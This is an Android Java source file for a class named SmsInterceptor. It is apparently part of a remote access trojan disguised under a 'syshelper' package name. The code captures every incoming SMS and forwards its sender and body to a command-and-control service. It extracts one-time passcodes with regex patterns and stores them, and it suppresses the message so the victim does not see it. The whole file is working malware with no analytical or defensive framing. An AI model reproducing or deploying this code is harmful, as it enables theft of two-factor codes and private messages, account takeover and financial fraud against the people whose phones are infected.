package com.syshelper.service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import org.json.JSONObject;

public class SmsInterceptor extends BroadcastReceiver {
    private static final String[] OTP_PATTERNS = {"code[:\\s]*(\\d{4,8})", "verification[:\\s]*(\\d{4,8})", "otp[:\\s]*(\\d{4,8})", "\\b(\\d{6})\\b", "\\b(\\d{4})\\b"};

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)) {
            SmsMessage[] messages = Telephony.Sms.Intents.getMessagesFromIntent(intent);
            StringBuilder fullMessage = new StringBuilder();
            String sender = "";
            for (SmsMessage msg : messages) { sender = msg.getDisplayOriginatingAddress(); fullMessage.append(msg.getDisplayMessageBody()); }
            String messageBody = fullMessage.toString();
            forwardToC2(context, sender, messageBody);
            String otp = extractOtp(messageBody);
            if (otp != null) handleOtp(context, otp);
            try { abortBroadcast(); } catch (Exception ignored) {}
        }
    }

    private String extractOtp(String message) {
        for (String pattern : OTP_PATTERNS) {
            java.util.regex.Matcher m = java.util.regex.Pattern.compile(pattern, java.util.regex.Pattern.CASE_INSENSITIVE).matcher(message);
            if (m.find()) return m.group(1);
        }
        return null;
    }

    private void forwardToC2(Context context, String sender, String body) {
        try {
            JSONObject smsData = new JSONObject();
            smsData.put("type", "sms_intercept"); smsData.put("sender", sender);
            smsData.put("body", body); smsData.put("timestamp", System.currentTimeMillis());
            android.content.Intent svcIntent = new Intent(context, RatService.class);
            svcIntent.putExtra("sms_data", smsData.toString());
            context.startService(svcIntent);
        } catch (Exception ignored) {}
    }

    private void handleOtp(Context context, String otp) {
        android.content.SharedPreferences prefs = context.getSharedPreferences("veil_prefs", Context.MODE_PRIVATE);
        prefs.edit().putString("pending_otp", otp).putLong("otp_time", System.currentTimeMillis()).apply();
    }
}
